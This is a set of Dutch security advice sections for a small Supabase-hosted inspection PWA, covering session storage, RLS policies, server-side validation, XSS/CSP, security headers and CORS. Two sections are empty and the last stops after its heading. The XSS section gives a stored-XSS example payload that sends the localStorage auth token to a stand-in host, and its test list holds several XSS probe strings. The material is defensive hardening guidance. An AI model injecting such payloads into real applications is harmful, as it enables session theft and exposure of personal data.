
===== 01-auth =====
None

===== 02-sessies-csrf =====
## 1) Risico voor déze app
De grootste kans is XSS via de huidige UI: inline `onclick` dwingt CSP tot `script-src 'unsafe-inline'`. Eén gemiste escaping in inspectievelden, namen of acties en een aanvaller kan `localStorage` uitlezen. Supabase-JS bewaart de sessie daar standaard: access-JWT én refresh-token. Met het refresh-token kan een aanvaller langdurig namens de inspecteur/coördinator data lezen, foto’s openen en acties wijzigen. Foto’s kunnen personen tonen; dat maakt impact AVG-relevant. HttpOnly-cookies zouden tokenuitlezing voorkomen, maar niet alle XSS-schade: XSS kan nog steeds met de sessie API-calls doen.

## 2) Wat Supabase/hosting regelt — en niet
Supabase regelt TLS, Auth-endpoints, wachtwoordhashing, JWT-uitgifte, refresh-endpoints en optionele refresh-tokenrotatie. Het regelt **niet** jouw RLS, CSP, XSS-preventie, tokenopslag in de browser of private Storage-policies. Netlify/Vercel/Cloudflare regelen HTTPS/TLS, maar standaard geen strikte CSP/security headers. De anon-key in de client is normaal; `service_role` mag nooit in de PWA.

## 3) Concrete maatregelen

**Keuze:** gebruik voor deze statische PWA Supabase’s standaard localStorage-sessie met korte JWT’s en rotatie. HttpOnly-cookies kunnen hier niet vanuit browser-JS worden gezet; dat vereist een Edge Function/auth-proxy. Voor ~5 gebruikers is dat overkill. Accepteer dus: localStorage + strikte CSP + geen inline handlers.

**Supabase Auth (Dashboard → Authentication → Sessions):** JWT expiry `3600` (of `900` bij hoger risico), refresh token rotation **aan**, reuse interval `10s`, timebox bijvoorbeeld `7d`. Zet Site URL/redirect-allowlist exact. Storage-bucket `inspectiefotos` **private**.

**Clientconfig (self-host supabase-js, geen CDN):**
```html
<script src="/js/vendor/supabase.js"></script>
<script>
const sb = supabase.createClient('https://<project>.supabase.co', '<anon-key>', {
  auth: { persistSession: true, autoRefreshToken: true, detectSessionInUrl: true, flowType: 'pkce' }
});
</script>
```

**CSP/headers:** verwijder de CSP-meta en zet headers in `_headers` (Netlify/Cloudflare Pages):
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://<project>.supabase.co; connect-src 'self' https://<project>.supabase.co wss://<project>.supabase.co; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(self), geolocation=(self), microphone=()
```
Vercel gebruikt `vercel.json` in plaats van `_headers`.

**Inline handlers vervangen** door event delegation:
```js
document.addEventListener('click', (e) => {
  const el = e.target.closest('[data-action]');
  if (!el) return;
  if (el.dataset.action === 'save-inspection') saveInspection(el.dataset.id);
});
```
Gebruik `textContent`, geen `innerHTML` met gebruikersdata.

**RLS voorbeeld:**
```sql
create type public.app_role as enum ('hoofd','coordinator','inspecteur');
create table public.profiles (
  id uuid primary key references auth.users(id) on delete cascade,
  role public.app_role not null default 'inspecteur',
  naam text
);
alter table public.profiles enable row level security;

create or replace function public.app_current_role()
returns public.app_role language sql stable security definer set search_path=public as $$
  select role from public.profiles where id = auth.uid()
$$;
revoke all on function public.app_current_role() from public;
grant execute on function public.app_current_role() to authenticated;

create policy "profiel eigen of hoofd" on public.profiles
for select to authenticated
using (id = auth.uid() or public.app_current_role() = 'hoofd');

create table public.inspections (
  id uuid primary key default gen_random_uuid(),
  inspector_id uuid not null references public.profiles(id),
  status text not null default 'concept',
  data jsonb not null default '{}'::jsonb,
  created_at timestamptz not null default now()
);
alter table public.inspections enable row level security;

create policy "inspecties lezen" on public.inspections for select to authenticated
using (public.app_current_role() in ('hoofd','coordinator') or inspector_id = auth.uid());

create policy "inspecties invoegen" on public.inspections for insert to authenticated
with check (public.app_current_role() in ('hoofd','coordinator') or inspector_id = auth.uid());

create policy "inspecties wijzigen" on public.inspections for update to authenticated
using (public.app_current_role() in ('hoofd','coordinator') or inspector_id = auth.uid())
with check (public.app_current_role() in ('hoofd','coordinator') or inspector_id = auth.uid());

create policy "inspecties verwijderen" on public.inspections for delete to authenticated
using (public.app_current_role() = 'hoofd');
```
Doe hetzelfde voor `photos` en `storage.objects` via een `exists`-check op `inspections`. Service worker: cache **nooit** `/auth/v1/token` of REST-responses met Authorization.

**CSRF:** bij Bearer-tokens in de `Authorization`-header is CSRF niet van toepassing: een cross-site formulier kan die header niet meesturen. Gebruik je later toch cookies, zet dan `Secure; HttpOnly; SameSite=Lax/Strict` en voeg CSRF-tokens toe voor state-changing requests.

## 4) Testen
- DevTools → Application → Local Storage: zie `sb-<ref>-auth-token`; laat JWT verlopen en controleer automatische refresh + gewijzigd refresh-token.
- CSP: test XSS-payload in inspectieveld; moet als tekst renderen, met CSP-violation in console.
- `curl -I https://app.example.nl`: controleer CSP zonder `unsafe-inline` voor scripts, HSTS.
- PostgREST: zonder JWT → 401/leeg; als inspecteur alleen eigen rijen; probeer andermans inspectie te updaten → 0 rijen/403.
- Storage: directe public URL op private bucket → 403; ongeautoriseerde select denied.
- Service worker offline: auth-endpoints niet gecachet; logout wist sessie en lokale gevoelige caches.

## 5) Niet van toepassing / overkill
CSRF-tokens bij pure Bearer-auth: niet nodig. HttpOnly/SameSite-cookies: niet realiseerbaar in deze statische PWA zonder server/Edge Function; voor deze schaal overkill. Zelf JWT’s ondertekenen of refresh-logica bouwen: niet doen; Supabase Auth doet dit. JWT in IndexedDB i.p.v. localStorage: geen securitywinst tegen XSS. `service_role` in client: nooit.

===== 03-database-rls =====
## 1) Risico voor déze app
De echte risico’s zijn niet “SQL-injectie in vanilla JS” (je hebt geen SQL-client in de browser), maar: (a) de **anon-key is publiek** en zonder goede RLS kan iedereen met de key alle inspecties/foto’s/namen lezen; (b) de **service_role-key** omzeilt RLS volledig — één keer in je statische bundle = volledige database; (c) XSS door `unsafe-inline` kan een JWT stelen en namens een inspecteur data wijzigen; (d) een `SECURITY DEFINER`-RPC die te ruim is, wordt een RLS-gat; (e) zonder restore-test is een backup geen garantie.

## 2) Wat Supabase/hosting wel en niet regelt
Supabase regelt TLS, Auth/JWT, PostgREST-parameterisatie en RLS-infrastructuur. Het regelt **niet** automatisch jouw policies, rolmatrix, append-only log, Storage-policies, key-hygiëne of PITR. De anon-key mag in de client; de service_role-key nooit. PITR is een **betaalde add-on**, geen standaard; dagelijkse backups zijn afhankelijk van je plan. `_headers` beveiligt je database niet; CSP beperkt vooral XSS/schade.

## 3) Maatregelen met voorbeeldcode

**Rollen helper (voorkomt recursie):**
```sql
create type app_rol as enum ('hoofd','coordinator','inspecteur');

create or replace function public.mijn_rol() returns app_rol
language sql stable security definer set search_path=public,pg_temp as $$
  select rol from public.profiles where id = auth.uid()
$$;
revoke all on function public.mijn_rol() from public, anon;
grant execute on function public.mijn_rol() to authenticated;
```

**RLS per tabel** (voorbeeld; herhaal voor waarnemingen/acties via `exists` op `inspecties`):
```sql
alter table public.inspecties enable row level security;
alter table public.inspecties force row level security;

create policy inspecties_select on public.inspecties
for select to authenticated using (
  inspecteur_id = auth.uid() or public.mijn_rol() in ('hoofd','coordinator')
);
create policy inspecties_insert on public.inspecties
for insert to authenticated with check (
  inspecteur_id = auth.uid() or public.mijn_rol() in ('hoofd','coordinator')
);
create policy inspecties_update on public.inspecties
for update to authenticated using (
  inspecteur_id = auth.uid() or public.mijn_rol() in ('hoofd','coordinator')
) with check (
  inspecteur_id = auth.uid() or public.mijn_rol() in ('hoofd','coordinator')
);
```
`planning`: inspecteur alleen eigen rijen (`inspecteur_id=auth.uid()`), hoofd/coordinator alles; schrijven alleen hoofd/coordinator. `monteurs`: lezen toegestaan voor authenticated, schrijven hoofd/coordinator. `profiles`: alleen eigen profiel of hoofd/coordinator lezen; **geen client-update/insert/delete-policy** — rolwijzigingen via dashboard/Edge Function, anders kan iemand `rol` escaleren.

**Append-only auditlog:**
```sql
alter table public.actie_log enable row level security;
create policy actie_log_select on public.actie_log
for select to authenticated using (
  exists (select 1 from public.inspecties i
          where i.id = actie_log.inspectie_id
            and (i.inspecteur_id=auth.uid() or public.mijn_rol() in ('hoofd','coordinator')))
);
revoke insert, update, delete on public.actie_log from anon, authenticated;
grant select on public.actie_log to authenticated;

create or replace function public.log_actie() returns trigger
language plpgsql security definer set search_path=public,pg_temp as $$
begin
  insert into public.actie_log(actie_id, inspectie_id, gebruiker_id, actie, oud, nieuw)
  values (coalesce(new.id,old.id), coalesce(new.inspectie_id,old.inspectie_id),
          auth.uid(), tg_op, to_jsonb(old), to_jsonb(new));
  return coalesce(new,old);
end $$;
revoke all on function public.log_actie() from public, anon, authenticated;
create trigger trg_log_actie after insert or update or delete on public.acties
for each row execute function public.log_actie();
```
Let op: service_role en dashboard kunnen nog steeds wijzigen; “append-only” geldt voor de client-API, niet tegen superusers.

**Storage:** bucket `inspectiefotos` privé; policy op `storage.objects` met `bucket_id='inspectiefotos'` en `exists` op `inspecties` via `(storage.foldername(name))[1]::uuid`. Gebruik korte signed URLs.

**RPC’s:** gebruik `supabase-js`/PostgREST met parameters: `.from('inspecties').select().eq('id', id)`, `.rpc('fn', { p_id: id })`. Geen stringconcatenatie voor SQL. `SECURITY DEFINER` alleen als nodig, met `set search_path=public,pg_temp`, `revoke execute from public, anon`, `grant execute to authenticated`, en **valideer `auth.uid()` binnen de functie**; nooit `p_gebruiker_id` vertrouwen. Geen dynamische SQL.

**Client:** alleen `SUPABASE_URL` + `SUPABASE_ANON_KEY`. Service_role uitsluitend in Edge Function/dashboard. Auth: signups uit, e-mailbevestiging aan, korte JWT-expiry, MFA voor hoofd/coordinator, redirect-URL’s allowlisten.

**_headers** (Netlify/Cloudflare Pages; Vercel gebruikt `vercel.json`):
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://<project>.supabase.co wss://<project>.supabase.co; img-src 'self' data: blob: https://<project>.supabase.co; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
```
Verwijder inline `onclick` en vervang door `addEventListener`; dan kan `script-src` zonder `unsafe-inline`.

## 4) Testen
- SQL als gebruiker: `begin; select set_config('request.jwt.claims', json_build_object('sub','<uuid>','role','authenticated')::text, true); set local role authenticated; select * from inspecties; rollback;` Herhaal met anon en tweede inspecteur.
- Test dat `update/delete actie_log` en `insert actie_log` falen; test dat `mijn_rol()` niet door anon uitvoerbaar is.
- Test in de app met twee browsers/rollen; test Storage signed URL zonder toegang.
- `grep -R "service_role" dist/` moet leeg zijn.
- Test backup/PITR-restore in staging, niet alleen “backup bestaat”.
- Test CSP via securityheaders.com en browserconsole.

## 5) Niet van toepassing / eerlijk
SQL-injectie door SQL-concatenatie in de client is hier niet aan de orde; PostgREST parameteriseert filters. Wel blijft dynamische SQL in RPC’s riskant. `_headers` is geen databasemaatregel. RLS beschermt niet tegen service_role, dashboard of superusers. PITR is niet gratis/standaard; zonder budget: dagelijkse backups, export van auditlog en geoefende restore.

===== 04-validatie =====
# Server-side validatie voor de Werkplekinspectie-app

## 1. Het risico voor déze app

Jullie client-validatie in `webapp/js/*.js` is pure gemak: elke inspecteur (of iemand met een gestolen JWT) kan met DevTools of `curl` rechtstreeks PostgREST aanspreken. Zonder server-side regels betekent dat: een inspectie die door de verkeerde persoon op "afgerond" wordt gezet, een actie zonder geldige actiehouder, een oordeel buiten C/A/V/NVT, of een `monteur_naam` van 4 MB. Bij ~5 gebruikers is het geen aanvalsvector van buiten, maar wél een integriteits- én AVG-risico: inspectierapporten met persoonsgegevens moeten aantoonbaar kloppen, en "afgerond door toetser" is een bewering die je moet kunnen verdedigen. Client-side validatie telt daarbij niet als bewijs.

## 2. Wat Supabase en hosting wél en níet regelen

Supabase regelt: TLS, Auth met JWT, type-coercion in PostgREST (een `uuid`-kolom accepteert geen string), `NOT NULL` (Postgres dwingt dat af), en Storage met MIME- en size-limieten per bucket. **Niet** standaard: RLS staat uit tot je het aanzet, `text` heeft geen lengtelimiet, enums/CHECKs/triggers bestaan niet tot je ze schrijft, en business rules (toetser ≠ actiehouder) evenmin. Netlify/Vercel/CF Pages regelen HTTPS/HSTS en (via `_headers`) CSP — maar **niets** aan datavalidatie. Dat is volledig jullie verantwoordelijkheid in Postgres.

## 3. Concrete maatregelen

**Enums en constraints** (in een migratie, niet los in de Studio):

```sql
create type oordeel_type as enum ('C','A','V','NVT');
create type inspectie_status as enum ('concept','ingepland','in_uitvoering','afgerond','geannuleerd');

create table inspecties (
  id uuid primary key default gen_random_uuid(),
  coordinaat text not null check (char_length(coordinaat) between 1 and 200),
  monteur_naam text not null check (char_length(monteur_naam) between 1 and 100),
  toetser_id uuid not null references auth.users(id),
  actiehouder_id uuid not null references auth.users(id),
  status inspectie_status not null default 'concept',
  oordeel oordeel_type,
  afgerond_op timestamptz,
  constraint toetser_niet_actiehouder check (toetser_id <> actiehouder_id),
  constraint afgerond_consistent check (
    (status = 'afgerond') = (afgerond_op is not null)
  )
);
```

**RLS** (dichtzetten, dan openen):

```sql
alter table inspecties enable row level security;

create policy "lezen eigen of coordinerend" on inspecties for select
using (
  actiehouder_id = auth.uid() or toetser_id = auth.uid()
  or exists (select 1 from profiles p
             where p.id = auth.uid() and p.rol in ('coordinator','hoofd'))
);

create policy "inspecteur wijzigt eigen concept" on inspecties for update
using (actiehouder_id = auth.uid() and status in ('concept','ingepland'))
with check (actiehouder_id = auth.uid());
```

**RPC voor afronden** — dit is de enige weg waarlangs een toetser (die geen `actiehouder` is) de status mag zetten. `security definer` omzeilt RLS, dus doe de check expliciet:

```sql
create or replace function rpc_rond_inspectie_af(p_id uuid)
returns void language plpgsql security definer set search_path = public as $$
declare v_toetser uuid; v_status inspectie_status;
begin
  select toetser_id, status into v_toetser, v_status
    from inspecties where id = p_id for update;
  if v_toetser is null then raise exception 'Inspectie niet gevonden'; end if;
  if v_toetser <> auth.uid() then raise exception 'Alleen toetser mag afronden'; end if;
  if v_status = 'afgerond' then raise exception 'Al afgerond'; end if;
  update inspecties set status = 'afgerond', afgerond_op = now() where id = p_id;
end $$;
revoke all on function rpc_rond_inspectie_af(uuid) from public;
grant execute on function rpc_rond_inspectie_af(uuid) to authenticated;
```

**Trigger als vangnet** (defense-in-depth, `security invoker` — géén definer):

```sql
create or replace function trg_inspectie_guard() returns trigger
language plpgsql as $$
begin
  if old.status = 'afgerond' and new.status <> 'afgerond' then
    raise exception 'Afgeronde inspectie kan niet heropend worden';
  end if;
  if old.status = 'concept' and new.status not in ('concept','ingepland','geannuleerd') then
    raise exception 'Ongeldige statusovergang % -> %', old.status, new.status;
  end if;
  if new.status = 'afgerond' and old.status <> 'afgerond'
     and auth.uid() <> new.toetser_id then
    raise exception 'Alleen toetser mag afronden';
  end if;
  return new;
end $$;

create trigger inspectie_guard before update on inspecties
for each row execute function trg_inspectie_guard();
```

**Client** roept alleen de RPC aan — geen directe `update` op `status`:

```js
async function rondAf(id) {
  const { error } = await supabase.rpc('rpc_rond_inspectie_af', { p_id: id });
  if (error) return toonFout(error.message);
  // UI bijwerken
}
```

**`_headers`** (Netlify; Vercel: `vercel.json`; CF Pages: `_headers` idem):

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://<proj>.supabase.co; connect-src 'self' https://<proj>.supabase.co; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
```

**Supabase-instellingen**: RLS aan op álle tabellen (ook `profiles`, `acties`, `planning`); Storage-bucket `fotos` met `max file size 5MB` en `allowed MIME types: image/jpeg,image/png,image/webp`; Auth: e-mailbevestiging aan, JWT-expiry 1 uur; PostgREST: `db-schema` alleen `public`, `max-rows` op 1000.

## 4. Testen

- **SQL-editor / psql**: `insert into inspecties (...) values (...)` met `toetser_id = actiehouder_id` → moet falen. Idem `oordeel = 'X'`, `monteur_naam` van 500 tekens, `status = 'afgerond'` zonder `afgerond_op`.
- **PostgREST via curl** met JWT van een inspecteur: `PATCH /inspecties?id=eq.<andermans-id>` → 0 rijen (RLS) of exception. `POST /rpc/rpc_rond_inspectie_af` met verkeerde user → `Alleen toetser mag afronden`.
- **Playwright/Cypress**: verwijder `required`/`maxlength` in DevTools, submit — server moet nog steeds weigeren. Dit is de test die bewijst dat client-validatie slechts gemak is.
- **pgTAP** of een `tests.sql`-bestand in de repo dat je in CI tegen een Supabase-branch draait.

## 5. Wat níet van toepassing is

- **Edge Functions voor CRUD-validatie**: overkill. Postgres doet het atomair, sneller en zonder extra aanvalsoppervlak. Edge Functions alleen voor externe effecten (bijv. notificatiemail bij afronden).
- **Input-sanitization bij opslag**: XSS voorkom je bij *renderen* (`textContent`, geen `innerHTML`), niet door strings te strippen — dat corrumpeert data.
- **Rate limiting op inserts**: bij 5 geauthenticeerde gebruikers is RLS + Auth-rate-limits voldoende.
- **`unsafe-inline` in CSP oplossen**: dit is een reëel XSS-risico, maar staat los van formuliervalidatie. Pak het apart aan met event-delegation (`data-action`-attributen) — anders blijft de CSP verzwakt, ook al is je data integer.

===== 05-xss-csp =====
# XSS-bescherming in de Werkplekinspectie-app

## 1. Risico voor deze app

De UI wordt opgebouwd met `innerHTML`-templates waarin gebruikersdata terechtkomt: monteursnamen, actieomschrijvingen, inspectienotities. Eén kwaadwillende of gecompromitteerde inspecteur kan via een notitieveld `<img src=x onerror="fetch('https://evil/?t='+localStorage.getItem('sb-token'))">` opslaan. Dat is **stored XSS**: elke coördinator en het Hoofd Service & Montage die de inspectie opent, voert de payload uit. Omdat Supabase Auth de JWT standaard in localStorage bewaart, betekent dat sessiediefstal en volledige accountovername — met de bijbehorende RLS-rechten.

De gevaarlijkste plekken in jullie code:
- `onclick="doeIets(${JSON.stringify(obj)})"` — `JSON.stringify` escapet géén `"` voor de HTML-attribuutcontext. Een naam met `"` breekt uit het attribuut en injecteert een nieuwe handler of tag.
- `data:`-URLs van foto's: een geüploade SVG als `data:image/svg+xml,...` in een `src` voert in `<img>` geen script uit, maar wél bij directe navigatie of in `<object>`/`<iframe>`.
- Inline SVG via `innerHTML`: `<svg onload=...>` voert uit.
- CSP met `'unsafe-inline'` voor scripts neutraliseert de belangrijkste verdedigingslinie: elke geïnjecteerde inline handler of `<script>` werkt gewoon.

## 2. Wat Supabase en hosting wel/niet regelen

**Supabase**: RLS is autorisatie, geen XSS-preventie. PostgREST levert JSON, geen HTML — dus geen server-side XSS. Storage serveert bestanden met content-type; een publieke SVG-bucket is een XSS-vector bij directe navigatie. De anon key is publiek; de service_role key mag nooit in de frontend. Auth-tokens in localStorage zijn juist het doelwit.

**Hosting** (Netlify/Vercel/CF Pages): HTTPS en wat basisheaders, maar géén CSP tenzij je die zelf instelt. Geen enkele partij escapet jullie HTML.

## 3. Maatregelen

**a. Consequent escapen.** Centrale functie, altijd bij interpolatie:

```js
const esc = s => String(s ?? '').replace(/[&<>"']/g,
  c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
```

Beter: getagde template die automatisch escapet:

```js
const html = (str, ...v) => str.reduce((a,s,i)=>a+s+esc(v[i-1]??''),'');
el.innerHTML = html`<h2>${monteur.naam}</h2><p>${actie.tekst}</p>`;
```

Voor pure tekst: `el.textContent = ...` in plaats van `innerHTML`.

**b. Inline handlers weg, event-delegatie.** Vervang elke `onclick` door `data-action` + `data-id`:

```html
<button data-action="del" data-id="${esc(id)}">Verwijder</button>
```

```js
const handlers = { del: id => verwijder(id) };
document.addEventListener('click', e => {
  const b = e.target.closest('[data-action]');
  if (b) handlers[b.dataset.action]?.(b.dataset.id, b);
});
```

Nooit JSON in attributen; geef alleen ID's door en zoek data op in een Map/state.

**c. Foto's.** Gebruik blob-URL's uit IndexedDB (`URL.createObjectURL(blob)`) of Supabase signed URLs. Sta geen `data:`-URLs van gebruikers toe. Moet het toch: valideer prefix `data:image/(png|jpeg|webp);base64,` en weiger SVG. Voor SVG-uploads: bucket-policy die `image/svg+xml` weigert, of `Content-Disposition: attachment`.

**d. CSP zonder `unsafe-inline`.** Omdat alle JS al in externe bestanden zit, is `script-src 'self'` genoeg. Nonce kan niet (statische hosting, geen per-request rendering). Hashes zijn mogelijk maar onderhoudsgevoelig en overbodig zonder inline scripts. `_headers` (Netlify/CF Pages):

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' blob: https://xyz.supabase.co; connect-src 'self' https://xyz.supabase.co; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Strict-Transport-Security: max-age=31536000; includeSubDomains
```

Vercel: zelfde in `vercel.json` onder `headers`.

**e. Trusted Types.** Waardevol, maar eerlijk: zonder sanitizer verplaatst het alleen het probleem. Zet eerst report-only:

```
Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; trusted-types escaped-html
```

Eén policy die alleen jullie escape-template toestaat:

```js
const p = trustedTypes.createPolicy('escaped-html', { createHTML: s => s });
const html = (str,...v) => p.createHTML(str.reduce((a,s,i)=>a+s+esc(v[i-1]??''),''));
```

Alle andere `innerHTML = string` faalt dan — precies de bedoeling. Pas na opruimen enforcement aanzetten.

**f. RLS als vangnet.** Beperk blast radius:

```sql
alter table inspections enable row level security;
create policy sel on inspections for select using (
  inspector_id = auth.uid()
  or exists(select 1 from profiles p where p.id=auth.uid() and p.role in ('coordinator','hoofd'))
);
```

Storage-bucket private, alleen signed URLs.

## 4. Testen

- Injecteer in elk tekstveld: `<img src=x onerror=alert(1)>`, `"><script>alert(1)</script>`, `javascript:alert(1)`, SVG met `onload`. Moet als tekst verschijnen.
- `grep -rn 'onclick=\|onerror=\|javascript:' webapp/js/` moet leeg zijn.
- CSP: DevTools Console op violations; test met csp-evaluator.withgoogle.com en securityheaders.com.
- Trusted Types report-only: check console op violations bij elke `innerHTML`.
- Upload een SVG als foto, open de inspectie, navigeer naar de blob-URL — script mag niet draaien.
- OWASP ZAP baseline tegen staging.

## 5. Niet van toepassing

- **Nonce**: vereist server-side rendering per request; statische hosting kan dit niet.
- **Hashes**: alleen nodig bij inline scripts; na de refactor hebben jullie die niet.
- **DOMPurify**: overbodig zolang je geen rijke HTML rendert — escapen volstaat. Pas toevoegen als je ooit gebruikers-HTML wilt tonen.
- **CSRF**: Supabase-js stuurt JWT in de Authorization-header, geen cookies → niet van toepassing. Herzie dit bij cookie-auth.
- **SQL-injectie**: PostgREST parameteriseert; alleen relevant bij `rpc` met dynamische SQL.

===== 06-headers-https-cors =====
## 1) Risico voor deze app
De app bevat persoonsgegevens en foto’s van personen. De grootste risico’s zijn: XSS waardoor een aanvaller met de sessie van een inspecteur Supabase-data kan lezen/schrijven, clickjacking waardoor acties worden uitgelokt, en een te ruime CORS/API-configuratie waardoor de anon-key vanaf elke origin bruikbaar lijkt. De huidige CSP met `'unsafe-inline'` voor scripts door inline `onclick`-handlers biedt vrijwel geen XSS-bescherming. Security headers zijn geen vervanging voor RLS, maar verkleinen de impact van fouten.

## 2) Wat hosting/Supabase standaard regelt
Netlify/Vercel/Cloudflare Pages regelen TLS-certificaten en meestal HTTP→HTTPS-redirect. Ze zetten niet automatisch een strikte CSP, HSTS-preload of Permissions-Policy. Supabase regelt TLS, Auth-JWT’s en RLS-mogelijkheden, maar **niet** automatisch jouw CSP of een strikte CORS-allowlist voor PostgREST/Storage. De hosted Supabase-API is in de praktijk CORS-permissief; beveiliging moet uit JWT + RLS komen. Auth-redirect-URL’s en Edge Functions-CORS kun je wel beperken. Zet nooit de `service_role`-key in de browser.

## 3) Exacte maatregelen

### CSP: verwijder inline handlers
Vervang:
```html
<button onclick="save()">Opslaan</button>
```
door:
```html
<button data-action="save">Opslaan</button>
<script>
document.addEventListener('click', (e) => {
  const btn = e.target.closest('[data-action]');
  if (!btn) return;
  if (btn.dataset.action === 'save') save();
});
</script>
```
Hashen van `onclick` werkt niet praktisch; `'unsafe-hashes'` is geen goed alternatief. Zet daarna `script-src 'self'`.

### `_headers` voor Netlify én Cloudflare Pages
Zelfde bestand in de publicatie-root:
```txt
/*
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(self), microphone=(self), geolocation=(), payment=(), usb=()
  Cross-Origin-Opener-Policy: same-origin
  Cross-Origin-Resource-Policy: same-origin
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://PROJECT.supabase.co; connect-src 'self' https://PROJECT.supabase.co wss://PROJECT.supabase.co; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests
```
`style-src 'unsafe-inline'` alleen laten staan als je echt inline styles hebt. `frame-ancestors` werkt alleen als echte header, niet in een meta-CSP. Verwijder de oude meta-CSP of houd hem minimaal; dubbele CSP’s versterken elkaar.

### `vercel.json`
```json
{
  "headers": [{
    "source": "/(.*)",
    "headers": [
      {"key":"Strict-Transport-Security","value":"max-age=31536000; includeSubDomains; preload"},
      {"key":"X-Content-Type-Options","value":"nosniff"},
      {"key":"Referrer-Policy","value":"strict-origin-when-cross-origin"},
      {"key":"Permissions-Policy","value":"camera=(self), microphone=(self), geolocation=(), payment=(), usb=()"},
      {"key":"Cross-Origin-Opener-Policy","value":"same-origin"},
      {"key":"Cross-Origin-Resource-Policy","value":"same-origin"},
      {"key":"Content-Security-Policy","value":"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://PROJECT.supabase.co; connect-src 'self' https://PROJECT.supabase.co wss://PROJECT.supabase.co; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests"}
    ]
  }]
}
```
HSTS-preload pas indienen na controle dat **alle** subdomeinen van je custom domain HTTPS hebben. Voor `*.netlify.app`/`*.pages.dev` is preload niet realistisch; gebruik een eigen domein.

### Supabase: RLS en Storage
```sql
create type public.app_role as enum ('hoofd','coordinator','inspecteur');
create table public.profiles (
  id uuid primary key references auth.users on delete cascade,
  role public.app_role not null default 'inspecteur'
);
alter table public.profiles enable row level security;

create or replace function public.app_role()
returns public.app_role language sql stable security definer
set search_path = public as $$
  select role from public.profiles where id = auth.uid()
$$;

create policy "profiles lezen" on public.profiles
for select to authenticated
using (id = auth.uid() or public.app_role() in ('coordinator','hoofd'));

alter table public.inspecties enable row level security;

create policy "inspecties lezen" on public.inspecties
for select to authenticated
using (public.app_role() in ('coordinator','hoofd')
       or inspecteur_id = auth.uid() or created_by = auth.uid());

create policy "inspecties invoegen" on public.inspecties
for insert to authenticated
with check (created_by = auth.uid());

create policy "inspecties wijzigen" on public.inspecties
for update to authenticated
using (public.app_role() in ('coordinator','hoofd') or inspecteur_id = auth.uid())
with check (public.app_role() in ('coordinator','hoofd') or inspecteur_id = auth.uid());

create policy "inspecties verwijderen" on public.inspecties
for delete to authenticated
using (public.app_role() = 'hoofd');
```
Storage-bucket `inspectie-fotos` privé maken. Pad: `inspectie_id/bestand.jpg`.
```sql
create policy "fotos lezen" on storage.objects
for select to authenticated
using (
  bucket_id = 'inspectie-fotos'
  and exists (
    select 1 from public.inspecties i
    where i.id = (storage.foldername(name))[1]::uuid
      and (public.app_role() in ('coordinator','hoofd') or i.inspecteur_id = auth.uid())
  )
);
```
Auth-dashboard: Site URL `https://app.example.nl`, Redirect URLs exact `https://app.example.nl/**`. Edge Function-CORS:
```ts
const ALLOWED = 'https://app.example.nl';
Deno.serve((req) => {
  const origin = req.headers.get('origin');
  const cors = origin === ALLOWED ? {
    'Access-Control-Allow-Origin': ALLOWED,
    'Vary': 'Origin',
    'Access-Control-Allow-Headers': 'authorization, content-type, apikey',
    'Access-Control-Allow-Methods': 'POST, OPTIONS'
  } : {};
  if (req.method === 'OPTIONS') return new Response(null, { status: 204, headers: cors });
  return new Response(JSON.stringify({ ok: true }), {
    headers: { ...cors, 'Content-Type': 'application/json' }
  });
});
```
Gebruik geen `*` met credentials.

## 4) Testen
```bash
curl -sI https://app.example.nl | grep -Ei 'strict-transport|content-security|x-content|referrer|permissions|cross-origin'
curl -sI http://app.example.nl | head
```
Controleer in DevTools Console op CSP-violations. Test in een iframe vanaf een andere origin: moet geblokkeerd zijn. Test Supabase met anon-key + JWT van inspecteur vs. coordinator: inspecteur mag geen andermans inspecties lezen. Test Edge Function `OPTIONS` met `Origin: https://evil.example` → geen allow-origin. Controleer HSTS op hstspreload.org. Test camera/microfoon vanaf je eigen origin.

## 5) Niet van toepassing/beperkt
COEP is niet nodig en kan Supabase-afbeeldingen breken. HPKP, X-XSS-Protection en Expect-CT zijn obsoleet. SRI is alleen relevant bij CDN-scripts; jouw scripts staan lokaal. Nonce-CSP kan niet op statische hosting. Een echte CORS-allowlist voor Supabase PostgREST/Storage is er niet betrouwbaar; RLS is de grens. HSTS-preload kan niet op de standaard hosting-subdomeinen.

===== 07-rate-limit-monitoring =====
None

===== 08-admin-routes =====
## Beheerfuncties afschermen: advies voor de Werkplekinspectie-app

### 1. Het risico voor déze app
